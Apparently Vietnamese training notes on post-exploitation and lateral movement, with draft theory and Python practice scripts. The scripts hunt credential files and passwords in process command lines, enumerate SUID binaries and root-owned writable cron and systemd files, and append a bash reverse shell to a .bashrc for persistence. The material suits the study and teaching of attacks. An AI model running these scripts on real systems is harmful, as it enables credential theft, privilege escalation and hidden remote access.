# Post exploitation and Lateral movement
## 1.1. Post Exploitation là gì?

Tính đến hiện tại, chưa có một chuẩn định nghĩa nào dành cho Post-Exploitation. Tuy nhiên, theo như định nghĩa của (rapid7)[https://docs.rapid7.com/metasploit/about-post-exploitation/] thì Post-Exploitation bao gồm tất cả những hành động của threat actor sau khi threat actor thiết lập được phiên kiểm soát hệ thống từ xa. Việc thiết lập phiên kết nối có thể bởi các cách khai thác sau:
1. Tấn công social engineering.
2. Khai thác lỗ hổng bảo mật.
3. Tấn công brute force.

Nếu khai thác thành công, phiên kết nối có thể có quyền truy cập nằm trong 3 trường hợp sau:
1. Quyền cao nhất của hệ thống (`root` hoặc `NT SYSTEM`), nhưng điều này khá hiếm (trừ trường hợp thiết bị IOT có mật khẩu của `root` là mật khẩu mặc định).
2. Quyền của logon user.
3. Quyền của daemon user chạy dịch vụ mạng, ví dụ `www-data` hoặc `nginx`.

Như vậy, bước tiếp theo của threat actor sẽ là can thiệp vào tài nguyên hệ thống bị compromise nhằm:
1. Tìm kiếm điểm yếu trong hệ thống để khai thác nhằm nâng cấp quyền kiểm soát hệ thống.
2. Sửa đổi tài nguyên hệ thống nhằm duy trì khả năng kiểm soát từ xa để phòng trường hợp phiên hiện tại bị vô hiệu hóa.
3. Thu thập và phân tích các thông tin nhạy cảm tồn tại trong hệ thống, từ đó làm bàn đạp để mở rộng phạm vi kiểm soát sang các hệ thống, dịch vụ hoặc tài nguyên khác có liên quan. Các dịch vụ này có thể là các dịch vụ mạng nội bộ của một công ty, hoặc một dịch vụ liên quan tới cá nhân như banking.

Các hành động trên bao gồm các tactic Discovery, Credential Access, Collection, Persistence. Các thông tin thu thập được sẽ được sử dụng cho Lateral Movement, Privilege Escalation, Exfiltration. Những tactic này được chia theo MITRE matrix.

Để hình dung thực tế thì một hệ thống bị compromise có thể được chia làm 2 nhóm: máy người dùng cá nhân và máy người dùng doanh nghiệp. Đối với máy người dùng cá nhân, có rất nhiều dữ liệu số và các dịch vụ số.

![User's connection with cyber services, Researchergate](https://www.researchgate.net/publication/366670283/figure/fig1/AS:11431281110503228@1672583926537/dentity-Management-Services-Digital-Identity-2020.ppm)

Không dừng lại ở đó, máy bị compromise còn có thể kết nối tới các thiết bị khác. Nếu nơi đang sống càng có nhiều thiết bị thông minh, thì tức là càng có nhiều thiết bị nằm trong phạm vi bị tấn công lây lan.

![Smart home infographic, alamy](https://c7.alamy.com/comp/2EBY1FF/internet-of-things-smart-home-appliances-control-with-wearable-electronic-devices-colorful-isometric-infographic-poster-vector-illustration-2EBY1FF.jpg)

Hoặc đối với hệ thống doanh nghiệp, mô hình thiết kế có thể rất phức tạp, đồng nghĩa với việc có nhiều hệ thống có nguy cơ bị xâm nhập nếu một máy trong mạng nội bộ bị kiểm soát từ xa.

![Netflix's High level system architecture, geeksforgeeks](https://media.geeksforgeeks.org/wp-content/cdn-uploads/20210128214233/Netflix-High-Level-System-Architecture.png)

Với một mô hình hệ thống như vậy, số lượng các dịch vụ hoặc công nghệ khác nhau được sử dụng cũng sẽ rất đa dạng. Một sai sót nhỏ trong cấu hình, hoặc mật khẩu lưu ở trên máy bị kiểm soát cũng có thể dẫn đến việc những hệ thống quan trọng bị kiểm soát.

![Netflix's tech stack, bytebytego](https://substack-post-media.s3.amazonaws.com/public/images/a96d8b37-03f5-43b3-af22-bea2ee7a8ebb_1280x1810.jpeg)

Như vậy, việc có quyền kiểm soát một hệ thống chưa phải là điểm kết thúc mà chỉ là một bàn đạp để có thể mở rộng tấn công lên một quy mô lớn hơn.

## System enumeration: những thứ threat actor thu thập và phân tích.
đầu tiên, phải thu thập thông tin hệ thống để phục vụ cho các bước tiếp theo
Mục tiêu tìm kiếm:
1. Thông tin về hệ thống: hiểu rõ hơn về hệ thống và tìm kiếm software chưa được vá lỗ hổng
2. Tài nguyên có thể kiểm soát được (bởi quyền của phiên kiểm soát hiện tại): tìm kiếm điểm yếu hệ thống (mà threat actor có thể kiểm soát) nhằm nâng cao tối đa quyền, hoặc tìm kiếm credentials, hoặc thông tin nội bộ, hoặc chỉnh sửa dữ liệu để duy trì kiểm soát.

Để thực hiện các công việc này, threat actor phải chạy một số đoạn lệnh đặc thù, có thể đi kèm trong backdoor đang được sử dụng, hoặc phải tải lên =>
1. Nếu upload lên: dấu vết lưu file
2. Nếu sử dụng phương pháp chạy lệnh hệ thống: show nhiều thứ trong process tree
3. in memory: (liệu có vấn đề gì không?)

Trong quá trình thực hiện, các hành động có thể có những hành vi khác nhau như ghi file, kiểm tra metadata của file, đọc dữ liệu file. Các hành động này chiếm dụng tài nguyên nên có thể gây ra chậm máy, treo máy, hoặc gây noise tới các thành phần bảo mật. Để thực hiện thành công, ta cần cân bằng giữa thu thập dữ liệu và đảm bảo stealthy.


## Credential collection => "mỏ vàng"
[Theo định nghĩa của NIST](https://csrc.nist.gov/glossary/term/credential) thì credential là bằng chứng xác nhận sự tin cậy và thẩm quyền của một người dùng. Nó có thể là mật khẩu, token, câu hỏi bảo mật, vân vân...

Nếu xét trên tài nguyên hệ thống, credential có thể được lưu trữ trong file hoặc memory. Đối với in-memory, ta có một số trường hợp như sau:
- Credential có thể được lưu lại trong phân vùng RAM. Nó có thể là giá trị của một biến được chương trình đang chạy sử dụng, hoặc chương trình đã kết thúc nhưng giá trị của biến vẫn nằm trong memory. Ví dụ: [Lỗ hổng CVE-2023-32784 nằm trong Keepass](https://nvd.nist.gov/vuln/detail/cve-2023-32784).
- Giá trị in-memory này có thể được chia sẻ chung như clipboard, hoặc lưu trữ trong cache files tùy theo cách chương trình được thiết kế. Threat actor có thể đánh cắp credential nếu người dùng thực hiện hành động copy.
- Ngoài ra, trong nhiều trường hợp, credential còn nằm trong chính các flags khởi tạo một chương trình và được map vào file cmdline nằm trong procfs.

Trong khi đó, credential được lưu trữ trong file cũng rất đa dạng:
- Credential được lưu trữ trong các dịch vụ của hệ thống như database, web, ... Trong đó, các file configuration của web thường để mật khẩu hoặc token ở trạng thái cleartext. Database cũng có thể có commandline history chứa giá trị mật khẩu ở dạng cleartext. Trong vài trường hợp hiếm hoi, source code cũng có thể chứa hardcoded password.
- Người dùng thường có thể có credential nằm trong SSH key, trình duyệt hoặc các ứng dụng hàng ngày khác, hoặc đôi khi nằm trong history của SHELL đang sử dụng.
- Credential của hệ thống như file `shadow`, file cấu hình kết nối wifi, ...
- Các file backup hệ thống hoàn toàn có thể chứa credential. Các script chạy định kỳ cũng hoàn toàn có thể có credential nhằm xác thực cho dịch vụ hoặc cấp phép quyền hạn cho script để thực hiện chức năng.

Bên cạnh việc thu thập và sử dụng giá trị của credential thu thập được, ta cũng cần phải nhớ rằng credential có thể được reuse lại ở nhiều hệ thống hoặc dịch vụ khác nhau. Hoặc đối với một số hệ thống / thiết bị đơn giản, credential có thể là mật khẩu yếu hoặc mật khẩu mặc định từ nhà sản xuất. Điều này dẫn đến việc các hệ thống / thiết bị hoặc dịch vụ khác có thể bị chiếm quyền kiểm soát mà không cần phải biết trước credential chính xác.

## Persistence & maintaining access: Tìm kiếm vị trí mà threat actor có thể truy cập và kiểm soát
Tại sao cần persistence?
    - Duy trì quyền kiểm soát qua reboot, patch, hay incident response.
    - Đảm bảo access ngay cả khi credential bị đổi hoặc machine / service bị restart

Persistence ở những vị trí nào?
=> Tùy theo quyền của phiên hiện tại mà có thể sử dụng các biện pháp khac nhau:
- Đối với daemon user: để lại ưeb shell (todo: check có cách nào tạo persistence thông qua web server)
- Đối với normal user: on event and on-logon ví dụ như bashrc, hoặc add thông tin vào ssh key, ... hoặc đối với X11 thì có chỗ khác, ...
- System: ??

=> một số vị trí
 + Sẽ có những component sử dụng scripting, thực thi scripting. Ví dụ: ssh banner, hook script
 + On-event persistence: Chương trình được thực thi khi 1 event nhất định được thực hiện TODO hoàn thiện
 + Login persistence: chương trình được thực thi khi được boot TODO hoàn thiện
 + Vị trí càng ít người biết, càng khó bị phát hiện
- Vị trí:
    - **Activities:**
    - Logon persistence
        - System daemon
        - X-11 auto start
    - Schedule persistence:
        - systemd timer
        - cron
    - Event trigger persistence:
        - Shell config modification (`.bashrc`)
        - Udev rules
        - Hooking scripts (network hooking script for example)
    **Resources**:
    - **MySQL Plugin Load:** https://dev.mysql.com/doc/refman/8.4/en/plugin-loading.html
    - **Systemd as user**: https://serverfault.com/questions/841099/systemd-grant-an-unprivileged-user-permission-to-alter-one-specific-service
    - **System hook script locations:**
        - `/etc/needrestart/hook.d/`
        - `/etc/network/if-down.d/`
        - `/etc/update-motd.d`
    + Kernel module, bootloader, firmware, ...
    + Advanced: Memory persistence (?)

## Privilege Escalation: nâng cao

Privilege Escalation (leo thang đặc quyền) là một lớp lỗ hổng bảo mật trong đó một user hoặc tiến trình có thể thực hiện các hành động vượt ngoài phạm vi thẩm quyền được cấp ban đầu, dẫn đến việc kiểm soát các tài nguyên không thuộc quyền truy cập của thực thể đó. Hiện tượng này xảy ra khi:
- Chương trình hoặc các tài nguyên được chia sẻ bị cung cấp thừa quyền hạn, dẫn đến đối tượng đang nắm giữ đặc quyền ban đầu can thiệp được tài nguyên hoặc hành động với đặc quyền khác.
- Chương trình bắt buộc chạy ở quyền cao, nhưng lại nhận và xử lý dữ liệu một cách không an toàn từ phía đối tượng có đặc quyền thấp hơn kiểm soát, dẫn đến các hành động được thực thi trong ngữ cảnh đặc quyền cao bị đối tượng đó chi phối.

Khi một sản phẩm được đưa vào sử dụng, mọi quá trình đều có tiềm ẩn nguy cơ có lỗ hổng leo thang đặc quyền:

1. Quá trình triển khai: Việc cài đặt các thành phần yêu cầu phải sửa đổi tài nguyên hệ thống. Những hành động này có thể bao gồm cấp phát thừa quyền truy cập của một tài nguyên, dẫn tới khả năng bị can thiệp; hoặc cấp phát thừa quyền hạn cho một chương trình, dẫn tới việc chức năng có thể bị sử dụng để tác động lên tài nguyên hệ thống.
2. Quá trình vận hành: Việc vận hành hệ thống đòi hỏi hệ thống phải càng ổn định càng tốt. Điều này dẫn đến hệ thống không được cập nhật đầy đủ các bản vá. Ngoài ra, nếu chương trình được cập nhật cũng có thể có những thay đổi lên tài nguyên mà trước đó không hề có, gây ra nguy cơ tồn tại lỗ hổng bảo mật.

Bản chất leo thang đặc quyền là kiểm soát hành động với đặc quyền mới. Vì vậy, khai thác leo thang đặc quyền có thể sẽ overlap với các technique khác như software exploitation, credential attack, persistence, ... Một threat actor muốn thực hiện khai thác leo thang đặc quyền sẽ phải:

1. Xác định chương trình hoặc dịch vụ đang được cấp đặc quyền cao hơn mà không được cập nhật.
2. Xác định tài nguyên có thể kiểm soát được nhưng lại được sử dụng bởi đối tượng khác, ví dụ như schedule hoặc cronjob có thể sửa đổi được.
3. Xác định chương trình được phép thực thi với đặc quyền khác, ví dụ chương trình có SUID/GUID, có capabilities, hoặc cho phép thực thi trong sudoers hay polkit.

Các thông tin được thu thập sẽ được sử dụng để phân tích và đưa vào khai thác. Trong khuôn khổ module này, ta sẽ tập trung vào vấn đề tìm kiếm các điểm yếu trong hệ thống. Việc khai thác lỗ hổng nhằm leo thang đặc quyền sẽ được nghiên cứu ở phần sau.

## lateral movement: đi xa
- Ở level daemon user: vẫn có thể xem được netstat để xem connection nội bộ, hoặc chạy được tool để scan trong network range
- vẫn có thể xem xét một vài thông tin cơ bản
- nếu có ưeb => xem được các thông tin về db, vhost, container, ... (hoặc credential tới các dịch vụ khác ví dụ cloud)


## Connection, Execution and Extrl
- Connection & execution: 
1. Remind phần reverse shell
2. remote execute, c2 framework
3. đánh cắp dữ liệu
4. Giới thiệu tunneling

====

# Thực hành
- Tạo 1 script sử dụng os walkdir để tìm file có file name nằm trong list `goldmine = ["config.php", ".git-credentials", "id.rsa"]`. Lưu ý: walk dir khác walk dir đệ quy
```
import os

# Danh sách các tên tệp mục tiêu cần tìm
goldmine = ["config.php", ".git-credentials", "id.rsa"]

def find_sensitive_files(start_dir):
    """
    Duyệt qua các thư mục bắt đầu từ start_dir và tìm các tệp có tên trong danh sách goldmine.
    """
    print(f"[*] Bắt đầu tìm kiếm từ thư mục: {os.path.abspath(start_dir)}")
    print(f"[*] Các tệp cần tìm: {goldmine}\n")

    found_count = 0

    # os.walk trả về tuple (root, dirs, files) cho mỗi thư mục
    for root, _, files in os.walk(start_dir):
        # Lặp qua các tệp trong thư mục hiện tại (root)
        for file_name in files:
            # Kiểm tra xem tên tệp có nằm trong danh sách goldmine không
            if file_name in goldmine:
                # Tìm thấy tệp!
                full_path = os.path.join(root, file_name)

                # In đường dẫn tuyệt đối của tệp tìm thấy
                print(f"[+] Đã tìm thấy: {os.path.abspath(full_path)}")
                found_count += 1

    if found_count == 0:
        print("\n[!] Không tìm thấy tệp nào trong danh sách.")
    else:
        print(f"\n[*] Tổng cộng đã tìm thấy {found_count} tệp.")

if __name__ == "__main__":
    # Đặt thư mục bắt đầu tìm kiếm là thư mục hiện tại ('.')
    find_sensitive_files('/tmp/')
```
- Nghiên cứu procfs, tạo 1 script đọc cmdline trong procfs của toàn bộ tiến trình đang chạy
```
import os

# Danh sách các chuỗi cần tìm
SENSITIVE_KEYWORDS = ["password=", "passwd=", "pass="]

def check_procfs_cmdlines():
    """
    Duyệt qua /proc/[PID]/cmdline để tìm các chuỗi nhạy cảm.
    """

    # Chỉ hoạt động trên hệ thống giống Unix/Linux
    if not os.path.isdir('/proc'):
        print("[!] Không tìm thấy thư mục /proc. Script này chỉ hoạt động trên Linux/Unix.")
        return
    print("[*] Bắt đầu kiểm tra các tham số dòng lệnh trong /proc...")
    print(f"[*] Các từ khóa nhạy cảm: {SENSITIVE_KEYWORDS}\n")

    found_secrets = False

    # 1. Lặp qua các thư mục con trong /proc
    for entry in os.listdir('/proc'):
        # Kiểm tra xem tên thư mục có phải là PID (chỉ gồm số) không
        if entry.isdigit():
            pid = entry
            cmdline_path = os.path.join('/proc', pid, 'cmdline')

            # Kiểm tra xem file cmdline có tồn tại không
            if os.path.exists(cmdline_path):
                try:
                    # 2. Đọc nội dung file cmdline
                    # cmdline chứa các tham số cách nhau bởi ký tự null (\x00)
                    with open(cmdline_path, 'rb') as f:
                        content = f.read()

                    # Thay thế ký tự null bằng khoảng trắng để dễ đọc
                    cmdline_str = content.replace(b'\x00', b' ').decode('utf-8', errors='ignore').strip()

                    # 3. Kiểm tra các từ khóa nhạy cảm
                    for keyword in SENSITIVE_KEYWORDS:
                        if keyword in cmdline_str:
                            found_secrets = True
                            # In ra PID và tham số bị lộ
                            print("--------------------------------------------------")
                            print(f"[+] PHÁT HIỆN bí mật trong tiến trình (PID: {pid}):")
                            print(f"    Dòng lệnh đầy đủ: {cmdline_str}")
                            print("--------------------------------------------------")
                            # Đã tìm thấy một khớp cho PID này, chuyển sang PID tiếp theo
                            break
                except Exception:
                    pass

    if not found_secrets:
        print("\n[*] Không tìm thấy tham số nhạy cảm nào khớp với danh sách từ khóa.")

if __name__ == '__main__':
    check_procfs_cmdlines()
```

- Bài tập: Đọc bash history và trích xuất credential. Recommend iterate từng dòng.

## 2.2 Priv Escalation

TODO giari thích tại sao tìm trong default (usr/bin/), biến môi trường (add thêm?), opt (cài thêm)

### Example
- Tạo script tìm suid binary (advanced: SUID bởi owner nào)
```
import os
import stat
import pwd
import getpass

# Danh sách các thư mục cần quét. Quét toàn bộ '/' cần quyền root.
SCAN_DIRS = ['/bin', '/sbin', '/usr/bin', '/usr/sbin', '/usr/local/bin']
# Loại bỏ các thư mục /proc, /sys, /dev để tránh lỗi và tăng tốc độ
EXCLUDE_DIRS = ['/proc', '/sys', '/dev', '/mnt', '/media', '/run', '/tmp']

def find_dangerous_suid_binaries():
    """
    Quét các thư mục, tìm các tệp SUID và kiểm tra điều kiện "nguy hiểm".
    """
    # Lấy thông tin về user đang thực thi script
    current_username = getpass.getuser()
    current_uid = os.getuid()
    print(f"[*] User đang thực thi script: {current_username} (UID: {current_uid})")
    print(f"[*] Bắt đầu quét các thư mục: {SCAN_DIRS}\n")

    found_count = 0

    # Lặp qua các thư mục đã xác định
    for scan_dir in SCAN_DIRS:
        if not os.path.isdir(scan_dir):
            continue

        for root, dirs, files in os.walk(scan_dir, topdown=True):
            # Loại bỏ các thư mục đã định nghĩa (sửa đổi dirs tại chỗ)
            dirs[:] = [d for d in dirs if os.path.join(root, d) not in EXCLUDE_DIRS]

            for file_name in files:
                full_path = os.path.join(root, file_name)

                # Bỏ qua nếu không phải là file hoặc không thể truy cập
                if not os.path.isfile(full_path):
                    continue

                try:
                    # 1. Lấy thông tin stat của file
                    file_stat = os.lstat(full_path)
                    mode = file_stat.st_mode

                    # 2. Kiểm tra bit SUID
                    if mode & stat.S_ISUID:
                        found_count += 1

                        # 3. Lấy Owner UID và User/Group Execute Permission
                        file_owner_uid = file_stat.st_uid
                        is_executable = os.access(full_path, os.X_OK)

                        # Dịch UID thành username
                        try:
                            file_owner_name = pwd.getpwuid(file_owner_uid).pw_name
                        except KeyError:
                            file_owner_name = f"Unknown UID ({file_owner_uid})"

                        # 4. Kiểm tra điều kiện "Nguy hiểm"
                        # Nguy hiểm khi: (Owner khác User đang thực thi) VÀ (User đang thực thi có quyền Execute)
                        if file_owner_uid != current_uid and is_executable:
                            print(f" **Tìm thấy SUID binary nguy hiểm (Tiềm năng):** {full_path}")
                            print(f"   - Owner: {file_owner_name} (UID: {file_owner_uid})")
                            print(f"   - User hiện tại ({current_username}) CÓ quyền thực thi.")
                            print("-" * 50)
                except PermissionError:
                    # Bỏ qua các file mà script không có quyền truy cập thông tin
                    pass
                except OSError:
                    # Bỏ qua các file bị xóa trong quá trình quét
                    pass

    if found_count == 0:
        print("\n[!] Không tìm thấy SUID binary nào trong các thư mục được quét.")
    else:
        print(f"\n[*] Đã hoàn thành quét. Tìm thấy tổng cộng {found_count} SUID binary.")

if __name__ == "__main__":
    find_dangerous_suid_binaries()
```

- Tạo script tìm writable folder (user hiện tại write được folder user khác)
```
import os
import getpass
import pwd

# Danh sách các thư mục cần quét. Quét toàn bộ '/' cần quyền root.
SCAN_DIRS = ['/home', '/var/tmp', '/tmp', '/usr/local'] 
# Loại bỏ các thư mục /proc, /sys, /dev để tránh lỗi và tăng tốc độ
EXCLUDE_DIRS = ['/proc', '/sys', '/dev', '/mnt', '/media', '/run', '/tmp']

def find_writable_foreign_folders():
    """
    Duyệt qua các thư mục, tìm các thư mục có thể ghi được (writable)
    nhưng Owner lại khác user đang chạy script.
    """
    # Lấy thông tin về user đang thực thi script
    current_username = getpass.getuser()
    current_uid = os.getuid()
    print(f"[*] User đang thực thi script: **{current_username}** (UID: {current_uid})")
    print(f"[*] Bắt đầu quét các thư mục: {SCAN_DIRS}\n")
    found_count = 0

    # Lặp qua các thư mục đã xác định
    for scan_dir in SCAN_DIRS:
        if not os.path.isdir(scan_dir):
            continue

        # os.walk để duyệt qua các thư mục và thư mục con
        for root, dirs, _ in os.walk(scan_dir, topdown=True):
            # Loại bỏ các thư mục đã định nghĩa (sửa đổi dirs tại chỗ)
            dirs[:] = [d for d in dirs if os.path.join(root, d) not in EXCLUDE_DIRS]

            for dir_name in dirs:
                full_path = os.path.join(root, dir_name)
                try:
                    # 1. Lấy thông tin stat của thư mục
                    file_stat = os.lstat(full_path)
                    # 2. Kiểm tra quyền ghi (writable)
                    # os.access(path, os.W_OK) kiểm tra xem user hiện tại có quyền ghi không.
                    is_writable = os.access(full_path, os.W_OK)
                    if is_writable:
                        file_owner_uid = file_stat.st_uid
                        # 3. Kiểm tra điều kiện chính: Có thể ghi VÀ Owner khác
                        if file_owner_uid != current_uid:
                            found_count += 1
                            # Dịch UID thành username
                            try:
                                file_owner_name = pwd.getpwuid(file_owner_uid).pw_name
                            except KeyError:
                                file_owner_name = f"Unknown UID ({file_owner_uid})"

                            print(f" **Tìm thấy thư mục có thể ghi Owner khác:** {full_path}")
                            print(f"   - **Owner:** {file_owner_name} (UID: {file_owner_uid})")
                            print(f"   - User hiện tại ({current_username}) **CÓ quyền GHI** vào thư mục này.")
                            print("-" * 50)
                except PermissionError:
                    # Bỏ qua các thư mục mà script không có quyền truy cập thông tin
                    pass
                except OSError:
                    # Bỏ qua các lỗi khác (ví dụ: file/thư mục bị xóa trong quá trình quét)
                    pass

    if found_count == 0:
        print("\n[*] Hoàn tất quét. Không tìm thấy thư mục writable nào có owner khác user hiện tại.")
    else:
        print(f"\n[*] Đã hoàn thành quét. Tìm thấy tổng cộng {found_count} thư mục tiềm năng.")

if __name__ == "__main__":
    find_writable_foreign_folders()
```

- Tạo script tìm system service có thể ghi được:
```
import os
import getpass
import pwd

# Danh sách các thư mục chứa các tệp cấu hình quan trọng cần kiểm tra
CONFIG_PATHS = [
    # Cronjob Files
    '/etc/crontab',
    '/etc/cron.d',
    '/etc/cron.hourly',
    '/etc/cron.daily',
    '/etc/cron.weekly',
    '/etc/cron.monthly',

    # Systemd Service Files
    '/etc/systemd/system',
    '/lib/systemd/system',

    # Init.d/SysVinit Files
    '/etc/init.d',

    # At Job Files (ít phổ biến hơn)
    '/var/spool/cron/atjobs', 
]

def is_writable_by_current_user(filepath):
    """Kiểm tra xem user hiện tại có quyền ghi vào tệp/thư mục không."""
    return os.access(filepath, os.W_OK)

def find_writable_config_files():
    """
    Duyệt qua các đường dẫn cấu hình, tìm các tệp có thể ghi được và 
    Owner khác với user hiện tại.
    """
    current_username = getpass.getuser()
    current_uid = os.getuid()
    print(f"[*] User đang thực thi script: **{current_username}** (UID: {current_uid})")
    print("[*] Bắt đầu quét các thư mục/tệp cấu hình quan trọng...\n")
    found_count = 0

    # Lặp qua các đường dẫn đã định nghĩa
    for path in CONFIG_PATHS:
        if not os.path.exists(path):
            continue

        if os.path.isfile(path):
            # Nếu là một tệp (ví dụ: /etc/crontab)
            files_to_check = [path]
        else:
            # Nếu là một thư mục (ví dụ: /etc/cron.d)
            try:
                # Lấy tất cả tệp/thư mục trong thư mục con
                files_to_check = [os.path.join(path, f) for f in os.listdir(path)]
            except PermissionError:
                continue

        for full_path in files_to_check:
            # Chỉ kiểm tra các tệp, bỏ qua các thư mục con trong thư mục cron/systemd
            # Bỏ qua symlink vì symlink luôn hiển thị quyền write (mặc dù k được)
            if not os.path.isfile(full_path) and os.path.islink(full_path):
                continue

            try:
                # 1. Kiểm tra quyền ghi
                if is_writable_by_current_user(full_path):
                    file_stat = os.lstat(full_path)
                    file_owner_uid = file_stat.st_uid
                    # 2. Kiểm tra Owner
                    file_owner_name = "Unknown"
                    try:
                        file_owner_name = pwd.getpwuid(file_owner_uid).pw_name
                    except KeyError:
                        pass # UID không tồn tại

                    # Điều kiện báo cáo: Có thể ghi VÀ Owner khác root (hoặc khác user hiện tại nếu muốn)
                    # Ở đây ta ưu tiên tìm các file có thể ghi được mà chạy với quyền root (UID=0)
                    if file_owner_uid == 0:
                        # Thư mục/tệp cấu hình chạy với quyền root mà user thường có thể ghi
                        found_count += 1
                        print(f" **PHÁT HIỆN tệp cấu hình Writable & Root Owner:** {full_path}")
                        print("   - **Owner:** root (UID: 0)")
                        print(f"   - User hiện tại ({current_username}) **CÓ quyền GHI** vào tệp này.")
                        print("-" * 60)
                    # (Tùy chọn) In ra tất cả các file writable có owner khác user hiện tại
                    elif file_owner_uid != current_uid:
                        print(f"[+] Tìm thấy Writable Config File Owner khác: {full_path}")
                        print(f"   - Owner: {file_owner_name}")
                        print("-" * 60)

            except PermissionError:
                # Bỏ qua các file mà script không có quyền truy cập thông tin
                pass
            except OSError:
                # Bỏ qua các lỗi khác
                pass

    if found_count == 0:
        print("\n[*] Hoàn tất quét. Không tìm thấy tệp cấu hình Writable (Owner root) nào.")
    else:
        print(f"\n[*] Đã hoàn thành quét. Tìm thấy tổng cộng {found_count} tệp cấu hình Root Writable.")

if __name__ == "__main__":
    find_writable_config_files()
```

Bài tập:
- Tạo script kiểm tra version của kernel, so sánh xem nó có tồn tại lỗ hổng hay không (làm logic đơn giản, ví dụ version "7.1.2" thì iterate so sánh version sau đó show ra 1 bug nào đó đã thấy trên mạng, lưu sẵn vào script) => Mô phỏng tìm unpatched có exploit, sau đó phát triển ra với process, service
- Enumerate kernel modules
- Enumerate namespace and Cgroup escape (container breakout)

## 2.3 Persistence


### Example:
- Thêm 1 entry persistence vào 1 bashrc (ở đây sử dụng ví dụ là `/tmp/.bashrc`).
```
import os

# --- THÔNG SỐ CẦN THAY ĐỔI ---
# ĐỊA CHỈ IP và CỔNG CỦA MÁY ATTACKER (Server lắng nghe)
ATTACKER_IP = "127.0.0.1"  # Thay thế bằng IP thực tế
ATTACKER_PORT = 9001            # Thay thế bằng cổng lắng nghe thực tế
# -----------------------------

# Đường dẫn tệp mục tiêu
TARGET_FILE = "/tmp/.bashrc"

# Lệnh Reverse Shell (Bash)
# Lệnh này sẽ được chạy mỗi khi người dùng mở một terminal mới
REVERSE_SHELL_COMMAND = f"bash -i >& /dev/tcp/{ATTACKER_IP}/{ATTACKER_PORT} 0>&1"

def inject_reverse_shell():
    """
    Kiểm tra sự tồn tại của /tmp/.bashrc và chèn lệnh reverse shell.
    """
    print(f"[*] Đang kiểm tra tệp: {TARGET_FILE}")

    # 1. Kiểm tra sự tồn tại của tệp
    if os.path.exists(TARGET_FILE):
        print(f"[+] Tệp tồn tại: {TARGET_FILE}")
        # 2. Kiểm tra xem user có quyền ghi vào tệp không
        if os.access(TARGET_FILE, os.W_OK):
            print("[+] Có quyền ghi (Writable). Tiến hành chèn lệnh...")
            try:
                # 3. Mở tệp ở chế độ 'a' (append) để thêm vào cuối
                with open(TARGET_FILE, 'a') as f:
                    # Thêm ký tự xuống dòng trước lệnh (đảm bảo lệnh mới bắt đầu trên dòng mới)
                    f.write("\n\n# START INJECTED REVERSE SHELL\n")
                    f.write(REVERSE_SHELL_COMMAND)
                    f.write("\n# END INJECTED REVERSE SHELL\n")
                print(" CHÈN THÀNH CÔNG!")
                print(f"   Lệnh đã được chèn: {REVERSE_SHELL_COMMAND}")
                print("\n[!] Lệnh Reverse Shell sẽ được kích hoạt khi user khởi động shell mới.")
            except Exception as e:
                print(f"[-] LỖI: Không thể ghi vào tệp: {e}")
        else:
            print("[-] KHÔNG có quyền ghi (Writable) vào tệp. Không thể chèn lệnh.")
    else:
        print(f"[-] Tệp KHÔNG tồn tại: {TARGET_FILE}")

if __name__ == '__main__':
    inject_reverse_shell()

```
